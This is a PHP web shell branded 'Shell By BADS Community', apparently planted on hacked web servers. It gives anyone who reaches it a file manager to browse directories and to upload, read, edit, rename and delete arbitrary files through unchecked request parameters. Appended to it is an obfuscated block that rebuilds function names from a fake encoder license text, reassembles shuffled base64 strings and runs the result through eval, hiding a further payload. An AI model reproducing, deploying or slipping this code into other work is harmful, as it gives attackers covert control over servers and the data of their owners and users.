<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
<head>
	<title>RSF By H0rn3t Sp1d3rs</title>
	<link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet"> 
</head>
<style>
	* {
		font-family: cursive;
		color: #000;
		font-family: 'Cuprum', sans-serif;
	}

	body {
		background-repeat: no-repeat;
		background-attachment:fixed;
		background-size: 100% 1700px;
	}
	body h1{
		color: green;
		text-shadow: 2px 2px 2px #000;
		font-size: 40px;
	}
	.dir {
		text-align: center;
		font-size: 30px;
	}
	.dir a{
		text-decoration: none;
		color: #48D1CC;
		text-shadow: 1px 1px 1px #000;

	}
	.dir a:hover{
		text-decoration: none;
		color: red;
	}
	table {
		margin: 12px auto;
		height: 100%;
		border-collapse: collapse;
		font-size: 30px;
	}
	table,th {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: 3px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 2px 2px;
		color: #F0E68C;
		text-shadow: 1px 1px 1px #000;
	}
	table,td {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: .5px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 8px 8px;
		color: red;
	}
	table,td a {
		text-decoration: none;
		color:#8A2BE2;
		text-shadow: 1px 1px 1px #000;
	}
	table,td a:hover {
		text-decoration: none;
		color: red;
	}
	.button1 {
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: #000;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1 a{
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: red;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1:hover {
		text-shadow: 0px 0px 5px #fff;
		box-shadow: .5px .5px .3px .3px #555;
		text-decoration: none;
	}
	textarea {
		border: 1px solid green;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #fff;
		width: 100%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
		resize: none;
		background: green;
		color: #ffffff;
		font-family: 'Cuprum', sans-serif;
		font-size: 13px;
	}
</style>
<body>
	<br>
	<center>
	 <a href="https://t.me/+NkHQ5pe_dpUyYzI9" target="_blank">
        <img src="https://i.postimg.cc/NF6rNz68/20250201-021021.png" alt="Image" width="15%">
		<h1> Shell By <\- BADS Community </h1></center>
  <div class="dir">
	<?php  
	if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
		} else {
			$dir = getcwd();
		}

		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);

		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<a href="/">/</a>'; continue;
			} echo '<a href="?dir=';

			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
	if (isset($_POST['submit'])){

		$namafile = $_FILES['upload']['name'];
		$tempatfile = $_FILES['upload']['tmp_name'];
		$tempat = $_GET['dir'];
		$error = $_FILES['upload']['error'];
		$ukuranfile = $_FILES['upload']['size'];

		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
				echo "
					<script>alert('diupload!!!');</script>
					";
						

	
	}
	?>

	<form method="post" enctype="multipart/form-data">
		<input type="file" name="upload">
		<input type="submit" name="submit" value="Upload">
		
	</form>

  </div>
<table>
	<tr>
		<th>Nama File / Folder</th>
		<th>Size</th>
		<th>Action</th>
	</tr>
	<?php
	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

	echo '
	<tr>
	<td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
	<td>--</td>
	<td>NONE</td>
	</tr>
	';
	} 
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$jumlah = filesize($dir.'/'.$file)/1024;
	$jumlah = round($jumlah, 3);
	if ($jumlah >= 1024) {
		$jumlah = round($jumlah/1024, 2).'MB';
	} else {
		$jumlah = $jumlah .'KB';
	}

	echo '
	<tr>
	<td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
	<td>'.$jumlah.'</td>
	<td>
	<a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" class="button1">Hapus</a>
	<a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'" class="button1">Edit</a>
	<a href="?dir='.$dir.'&rename='.$dir.'/'.$file.'&nama='.$file.'" class="button1">Rename</a>
	</td>
	</tr>
	';
}
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table {
			display: none;
		}
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}

if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo "<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
	}
}
if (isset($_GET['ubah'])) {
	echo '

		<style>
			table {
				display: none;
			}
		</style>

		<a href="?dir='.$dir.'" class="button1"><=Back</a>
		<form method="post" action="">
		<input type="hidden" name="object" value="'.$_GET['ubah'].'">
		<textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['ubah'])).'</textarea>
		<center><button type="submit" name="go" value="Submit" class="button1">Liking</button></center>
		</form>

		';
}
if (isset($_POST['edit'])) {
	$data = fopen($_POST["object"], 'w');
	if (fwrite($data, $_POST['edit'])) {

		echo 
			'
			<script>alert("Berhasil diedit!!!");window.location="?dir='.$dir.'";</script>						
			';

	} else {
		echo "
			<script>alert('gagal');</script>					
			";
	}
}

if($_GET['rename']){
	if(isset($_POST['newname'])){
		if(rename($_GET['rename'], $_GET['dir'] . '/' .$_POST['newname'])){
			echo '<font color="green">Ganti Nama Berhasil</font><br/>';
			echo "<script>window.location='?dir=".$dir."';</script>";
		}else{
			echo '<font color="red">Ganti Nama Gagal</font><br />';
		}
	}
echo '<br><center><form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_GET['nama'].'" />
<input type="hidden" name="path" value="'.$_GET['dir'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form></center>';
}

?>
</table>
</body>
</html
<?php
$O00OO00 = "
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
 * 
 * ABOUT:
 * --------
 * This PHP Encoder is designed to securely encode data, shuffle characters, and manage 
 * data positions to make encoded content unreadable without a proper key. This encoder 
 * can be used for obfuscating sensitive data, protecting information from unauthorized 
 * access, and ensuring data integrity during transfer or storage.
 *
 * FEATURES:
 * ----------
 * - Encode strings into mixed and shuffled formats.
 * - Remove duplicate data entries automatically.
 * - Generate a key for decoding the encoded data back to its original format.
 * - Flexible design to support various data formats and encoding requirements.
 *
 * DEVELOPER INFO:
 * ----------------
 * Developer: Samiul Alim
 * Version: 1.0
 * Date: 2025-02-17
 * 
 * CONTACT:
 * ---------
 * - Email: samiulalim1230@gmail.com
 * - Telegram: https://t.me/samiulalim1230
 * - GitHub: https://github.com/samiulalim1/
 * - Telegram Channel: https://t.me/mr999plus
 *
 * LICENSE:
 * ---------
 * This script is licensed under the MIT License. You are free to modify, distribute, and 
 * use this script with proper attribution to the developer.
 *
 * DISCLAIMER:
 * ------------
 * This encoder is provided as-is without any warranties. The developer is not responsible 
 * for any misuse or data loss resulting from the use of this script.
 *
 * ENCODER ID : [JZQ5j-7a8b610ffb-MjAyNS0wMi0xNyAwMzozMToxOA-e68b9]
 * 
 * ============================================
";

$O00OO00 = str_replace(["\r\n", "\n", "\r"], "**", $O00OO00);
$OO0O0O0 = $O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[507];
$OO0O0O0 .= $O00OO00[54].$O00OO00[76].$O00OO00[144].$O00OO00[965].$O00OO00[1525];
$OO0O0O0 .= $O00OO00[76].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[79].$O00OO00[144];
$OO00000 = $O00OO00[817].$O00OO00[426].$O00OO00[275].$O00OO00[60].$O00OO00[54].$O00OO00[275];
$OOOO0O0 = $O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[1197].$O00OO00[60].$O00OO00[817];
$OOOO0O0 .= $O00OO00[426].$O00OO00[1525].$O00OO00[305].$O00OO00[1523].$O00OO00[145].$O00OO00[1197];
$O00O0O0 = $O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[817].$O00OO00[76].$O00OO00[144].$O00OO00[964];
$O00O0O0 .= $O00OO00[143].$O00OO00[917].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[204].$O00OO00[144];
$OO0O0O0 .= $O00OO00[204].$O00OO00[512].$O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[512].$O00OO00[917];
$OOOO0O0 .= $O00OO00[1526].$O00OO00[54].$O00OO00[1527].$O00OO00[189].$O00OO00[60].$O00OO00[54].$O00OO00[275];
$OO00000 .= $O00OO00[68].$O00OO00[964].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[806].$O00OO00[1523];
$O00O0O0 .= $O00OO00[965].$O00OO00[54].$O00OO00[204].$O00OO00[144].$O00OO00[965].$O00OO00[817].$O00OO00[204].$O00OO00[144];
$OOOO0O0 .= $O00OO00[1525].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[141].$O00OO00[60].$O00OO00[817].$O00OO00[426];
$OO00000 .= $O00OO00[145].$O00OO00[70].$O00OO00[204].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[917].$O00OO00[1523];
$OO0O0O0 .= $O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[145].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[144].$O00OO00[54];
$O00O0O0 .= $O00OO00[964].$O00OO00[512].$O00OO00[1527].$O00OO00[1525].$O00OO00[60].$O00OO00[54].$O00OO00[275].$O00OO00[816].$O00OO00[60];
$OOOO0O0 .= $O00OO00[189].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[68].$O00OO00[60];
$O00O0O0 .= $O00OO00[817].$O00OO00[1527].$O00OO00[1197].$O00OO00[426].$O00OO00[817].$O00OO00[204].$O00OO00[144].$O00OO00[964].$O00OO00[1525].$O00OO00[1525];
$OO00000 .= $O00OO00[145].$O00OO00[1197].$O00OO00[885].$O00OO00[1523].$O00OO00[145].$O00OO00[1197].$O00OO00[965].$O00OO00[143].$O00OO00[76].$O00OO00[144].$O00OO00[883].$O00OO00[512];

$OO0O0OO = $OO0O0O0.$OOOO0O0.$OO00000.$O00O0O0; $OO0O0O0 = "";
$OO0O00O = base64_decode($OO0O0OO); $O00OO0 = urldecode($OO0O00O);
$OO00OO0 = [60,40,8,2,19,2,19,2,19,2,19,2,19,23,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,41,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,25,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,42,30,13,10,53,39,28,33,22,46,55,4,52,70,18,47,34,44,38,51,43,3,27,68,57,7,16,63,26,15,56,64,21,54,48,12,9,49,11,66,61,20,62,40,40,36,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,40,69,24,40,40,40,40,65,58,40,40,40,40,40,40,40,32,67,37,5,1,40,40,40,40,40,40,40,35,50,59,14,40,40,6,17,40,40,45,40,40,0,2,19,2,19,2,19,2,19,2,31,29];

$O00O0O0 = [
	"goQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgASPf9FJgACIgACIgACIgACIgACIgACI",
	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gC",
	"QhXYpV3QyFDMZJlcldUZqVTcHFla1kTOMNDRBZTTuZTMOZndt9CZytieC9kb0dmcWFlMO9CZVNHUG9yU6JXVaBTcwoVdJlmWrFDO",
	"xhTRS10SYVDSlNVW5tGSGV2aQZ3QWh0M2kzKyYnMohVdSt2QuRTcHZmUBt2YxNjYatyTH9me3sEZOlWbI1kQNVmW4ZkdycjaY1WU",
	"gACIgACIgACIgACIgACIgACIgACIgAyOgACIgACIgACIgACIgACIgACIgACIgACIgACInUGZvNWZk9FN2U2chJ2JgACIgACIgACI",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK0wOn0TRHpVaxcVWzlTMYdSPf91Xf91Xf91X",
	"2dHdr0kS3pWQ040U5QnToJXSGlzUhR3VipXb0tET0Q0c1NUYBhURLl3RGRkRNVmTWtES4QzLEFFOjl3RwxESYdlMyRWb5ljQidGe",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgoQD",
	"2FjTsZWOz40S5gEOSxWS0lDOvB1V4dGRTl3dvYHSS9yNtZkephkdlV3KvQWcrY2YzVDNzQ1b4cjbIBFO65GUmhjaz9GbahHUycTd",
	"WJTewUWbhNWbwVXYRRkahdnN0NGW3QzbphzRtBXcz9iMshWdQ9UexkVQLVmMlJkYwpHZRNDMsFjbywGWhZmdtBXNxcmak9UQ3Q1b",
	"VVlV4IUZjR3dpVHSOBTMldzVIhzZQ9kMiFlZvklNtJGbshmd2VXc2YzVLlTYUdEbvdXY1IDVupVMkhUYk9UWkVVNvYHRJd1YlpmT",
	"a9iM2p1LiZWO5siMXdFWmZnd0xWMxMjcVtSSjpVbJRnS4ZTSvEncBV3S1V3MvY0SDZ1U6NTUURUdKx2aCR1L6JzVYZmd2FDM0YET",
	"h9SNuN1NE12LhVzLOVWO5siN3BFOIlkVFFXUkJkVidEZCJnZuljbttmayFETq9WZ0BnVY9WZQ5ENHt0d0NTUFRjR4g1U1NHcldXM",
	"gACIgACIgACIgAyOnonTYpVeChlY25UbiFDczoFIn0zXf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"4ZUW2VjcKNzZSV2dnx2diRjT4EWbWtWcxlGUypVdEt2T3wUbzp1cBhUTa10MSlFNLd0UPhlMjtUY5QnWRdzMTJkWzB1Vy5EdyY3d",
	"TV1YzM2Ki1mNNNmYqZ1a3Mzc3g1bI9SMLNnT5VVU3siVvtmZx12KzomRWp2QZVUT3FGUDB1RYRTdtdXaSlVQOVWQ4sGOG9EW45UO",
	"f91Xf91Xf91XkoQD7cSP9c3TwhjRK92dXllMWdUS1pEWkBjVtN2J981Xf91Xf91Xf91Xf91XkACIgACIgACIgACIgACIgACIgACI",
	"x52T2g2Lu10avQmRkpnM4ZGZNp2VuhneGVld2d2M1QjNmpFenNjNlBHWEJTNWt2YyEmevlnczw2d1Inc0V1cupGOxdWawcDMBlne",
	"NoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI7kyXf91XkgyXfRSPf91X",
	"mFzSw5WYx50QrYUW4JXWOhUYvMWeJN2asR2MWJ0V69ScVNGaad0bo1URpN3S5UjMwATcGxWYxFTOvVGaPpmMmRGSadkNt1GawVFW",
	"xsGOupne0YkYk1ESnBFbpxWav00b2QnUjVVd3dFUHJjbYpkZsRHc6JVawwWMjFUbDdTMuZUeO5kWVNzMitEV6p0NENGSC50Y4RFS",
	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"f91Xf91Xf91Xf91Xf91Xk0zXf91Xf91Xf91XkACIgACIgACIK0wOp81Xf91Xf91Xf91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf9FJ",
	"gACIgACIgACIgACIgACIgACI7kCKf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"at2TxVVcr9iS6tURYple5UUR3g3ckpEc5MTe39iayQXQOhTTHpXUFNEewF1RrcUZE5mbPZUZDpmdygTMxQmc5YlZsVVVt9SMMhGS",
	"O9mUycVQBF2dpF0LvdzTZJGcahHOjZWR2hkNvFXT3g2K2AHNNlHc0gFOEZTc18CZEBFWUFDeZVkWtllSkJ2YCh1Qkp2cCJTV4NXY",
	"QNmWSlWd00kY0VDePVEa5xGcihFTOl0aKVmRuVnNrsmajxWOCNHUEpVY2tWczM2V3NzS3NUT05kan10VUx0ZKB1d0gVd2FENzNmc",
	"wEjNihTY3AiOElEIy9GdhN2c1ZmYPBCUIBFIzVHbQlTO5IXTgcmbpRWYvx0J98FJ7ciZ05WayB3J981XkACIgACIgACI",
	"gACIgACIgoQD7cSP0ATUal1KBtyL45Wb1lHTVZjeu5EaWtCb3cjZuFnZJ9COQJWeW90Krc3LBBlQjlDVqZ2V2BHZzgDU3MDU4MGM",
	"NoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDgACIgACIgAiCNszJ5IGO2UWLB9EevRVT69meNdXQ55EewkWT3BzUOlXQq1ULiZmZ",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACI913OpIyO91XZk92QzRye7lycnJXQzRCKu9Wa0Nmb1ZGIuJXd0VmcigCbhZXZg4mc",
	"wRkTUFzVVB1U09kRINkM6J2dwFUMyR2aktiWiF3Zx9UbIh1NRdkRwdncvITcrIzZhdlMOlldktkWitSVFRlNVF1TCtmW012Q5tUb",
	"QdWW2llbrcUdzETbv8yZPVUaqJ3c5wGarElTCF3NL1kTHl2QsRDVphFWoJ2Tr4URKl2LHp3LyxmRxhWUmBFNP90b5ImYuJkR1N1a",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOnonUuJGbS5mY",
	"gACIgACIgACIgACIgACIgACIgACI7kyXf91XfRCKf9FJ981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"gACIgACI7kyXf91Xf9FJo81Xk0zXf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"YZmcxtmNkFDM0QHVi5GbxQlasJ0ZNJkazIFRxgldB9kaYZjVhF1KkdXWOdUcwNHNad3caNXduZVNNp0TrRGWwlneSJlNZxUWHN2K",
	"3MTNqVjWxFDcxFEca9WbzkjS0VjcNJkSJFHO2Y1N4RWVS12YThkN58UboZlUmdzV1lkMxxkajJ2dMJEemZjVxAVRvADdtRFVi5UM",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyboNWZgACIgACIgACIgACI",
	"gACIgACIgACIgACIgACIgoQD7kCKf91XfRSPf91Xf91Xf9FJgsTKpkyXkgyXfRCKf91Xf91XkgyXf91Xf91Xf91XksTKo81XfRCI",
	"mRzZWBzbvRFN0gUVJlDdQVmZtpmcOdlayBlQrsCSyU1M2VURQdmNyhXdSFEWzpUZLZjbqhnVygmbOVDelpUWzUVWZ1WO2kFO2gGZ",
	"1w0LIlme0V2M15ET2sSYutiNycXU0EzMjlGeXVFUvI1KSdFRxEnZ0JlchNDRrhGTCJkRrIERIVjeCdzMSpXQJdTTVB1NrV2M2kWa",
	"gACIgszJ1Z0VaNnTyg1a1clWmpkMiBCIgAyJ981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"sNGdKp3MSVGZnZXeK9kTmNHcu1WR5Enb1sUN1AzZutCOx40dDpHO4ZDOSlld1gXe3kXVjtiZEJWOhVUd0dHMJFmY5dWZ4EDOQJkZ",
	"4JTN0YncwBDNIhXZM5Wd1JEaNd1aIFmW69Ue2I0cjdjS5E0YsFTVxJXVTNWRMJzZzpnT5g1NhRlcERFWzxmN69kUnZ3Q2QmTEREc",
	"p1mMww2Z2U3bKx0c0EXYhtSQkhjMWBXdrRGNmZWUy8iYiRWO5siMXdFVQlmN3IERrsiSah1S5MjaldDTQtyQFRnTY9SOrIzVXRld",
	"5EDWUFGeydTY04kWQZjWudXc5VTeHJWdzgmTr1GdH9yVzd1M5pHdIdTOXVjN38SbGRmdvEjTml3TyQncTN2VrsCSQpnaYdTamVGe",
	"25kMYBjVyolZKJjYn0zXf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"T9CcvcGOGtWU2N0VhBFSSxUeIhnbJRVeYlDOwJXesF0TBp3LkN2QEF1ZsR0KzcmS3hlYjJjQ1NXQuFFRLhjRjVWdldDe0UFbVplb",
	"NJzZzknVrYmVzpnQORURaJGOsB3M3UzNBZ2QlJzSqJkRSZ1Nuhmbkd2NwNGay5Gc6JEbuRHUrhUeGd2VthjcE5UMzE0ayNWRZZXa",
	"1lWOZFHU4hzYLRlWK1mMuNkTLdDcw4GZ4VmQ18kQ4c1TJFzLwAVT5RkNvU0Z5Q0bWlVUxIXWEh1L1hEcXJEMONWWLNlTYJ0Z2QWU",
	"mhWSKBjUjV3LplGSSdVd2BVUp9kZ5kVNO1GdX10TpJFc3ZTQ3EzUMJWS2UUYXxGM48yYWRGZ0VzS142ZGxmTpVETxE1RrETd2tya",
	"PtkNqdnWYlkNmtiRRBFSwoGbvYEeVRTa4VFeUp0TVNGVMJUej9iM5pXcyoUe2UGWlZTbxMHSQ92RWl1LQlncvY3ZOh2MGdGSKlTS",
	"ud2V1V3QlFmZMZUeKZGbj9CczIWdvxWSJNlYXhlQYhDdshlNMJmMlhUS4hGTTl0QWFXb5BlT1AVQz8GNMV1KSpGdB5GORhjW38SO",
	"5gFM0gjeDpHMvIjTyc2d58EVqFHNR90QERlawFmYFhXR1siRtRWWMt0VNdFN1VGbvNEOmJURmtUbwkFZYJTS2E0ayNmVsBHN5RTQ",
	"f91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf91Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOn0TUuNGaSNzYmpkMiBCIn0zXf9FJgACIgACIgACI",
	"781Xf91Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"gACIgsTKf91XkgyXfRSPf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"fRCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"5Y3UrAFeuhkbxUFO5s2T2gVQmpHa3RzYvcmY2IWcuhkbXBndo12LX5mc0czbGNFUi5keYJETrxGNaBlezFjZPx2U1FVVw10QFd1L",
	"1EldZpUWk9mU1d1N1ITaVZWeXtEUT5kW5ZzaXhjNUdHbkJmawZWNuRTdtVjeBR1aR9WSTNFb5dFWvQmRilXesJzMoJUaylXdFFDd",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91X",
	"1ZmQo1UeLZXNzYzZBhmQJJjQYtSRFJjSzlEN1p3cLZnVl1EMvAXOsZ2Unhzb2RXMXRncOV2J98FJgACIgACIgACIgACIgACIgACI",
	"1RXZytXKlR2bDNHJsM3ZyF0ckgSYkJWbhx2XfBibvlGdj5WdmtXKpcSYkJWbhx2XfdCKzR3cphXZf52bpR3YuVnZhgiZpBCIgACI",
	"qJUVjdkN6tGVZR0KyljVUdUWL9mUMNUNuFFRXxWSPtmePtURtJUeiVTVvMTSmB3bvVTUCN3NqVTbyxGT3tmT5U3U59WVGpEaWJXT",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91Xf9FJscyXkcCKf91X",
	"wVTW2U2ajJzMJ9SO2M1YrYETQFETKhDMyNFbJh1S35mZ5QHe2smUkNTZFdUToV1Mxl1YxZ1Su9iTst0VkRWezUDWRpFewhFVZFFS"
];

$OO0000 = $O00OO0[7].$O00OO0[36].$O00OO0[29];
$O00O0O = $O00OO0[3].$O00OO0[6].$O00OO0[33].$O00OO0[30];
$O0OO00 = $O00OO0[30].$O00OO0[22].$O00OO0[24].$O00OO0[26].$O00OO0[24];
$OO0O00 = $O0OO00[0].$O00OO0[18].$O00OO0[3].$O0OO00[0].$O0OO00[1].$O00OO0[24];
$O00O00 = $O00O0O[2].$O00OO0[10].$O0OO00[2].$O00OO0[24].$O0OO00[0].$O00OO0[9];
$O00O0O.= $O0OO00[1].$OO0000[1].$OO0000[2].$O0OO00[3].$O00O0O[3].$O00OO0[32].$O00OO0[35].$O00OO0[26].$OO0O00[3]; 

foreach($OO00OO0 as $OO00O0O){$OO0O0O0 .= $O00O0O0[$OO00O0O];}
eval($O00O0O($O00O00($OO0O0O0)));

?>